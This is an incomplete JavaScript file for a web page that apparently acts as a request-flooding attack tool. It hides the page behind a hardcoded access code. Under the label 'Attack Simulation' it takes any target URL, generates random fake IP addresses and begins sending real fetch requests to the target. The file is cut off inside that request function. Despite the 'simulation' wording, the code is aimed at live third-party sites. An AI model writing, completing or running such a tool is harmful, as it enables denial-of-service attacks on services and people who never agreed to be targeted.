document.addEventListener("DOMContentLoaded", function () {
    const loginPage = document.getElementById("login-page");
    const mainPage = document.getElementById("main-page");
    const loginButton = document.getElementById("login-button");
    const startAttackButton = document.getElementById("start-attack");
    const logContainer = document.getElementById("log");
    const validCode = "QZ-20-VB"; // Change this to your desired access code

    // Handle Login
    loginButton.addEventListener("click", function () {
        const code = document.getElementById("login-code").value;
        if (code === validCode) {
            loginPage.classList.add("hidden");
            mainPage.classList.remove("hidden");
        } else {
            alert("Invalid Code. Please try again.");
        }
    });

    // Handle Attack Simulation
    startAttackButton.addEventListener("click", function () {
        const targetUrl = document.getElementById("target-url").value;
        if (!targetUrl) {
            alert("Please enter a target URL.");
            return;
        }

        logContainer.innerHTML = ""; // Clear previous logs

        function generateFakeIP() {
            return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
        }

        async function sendRequest(url, fakeIP) {
            try {
                const response = await fetch(url, {
                    method: "GET",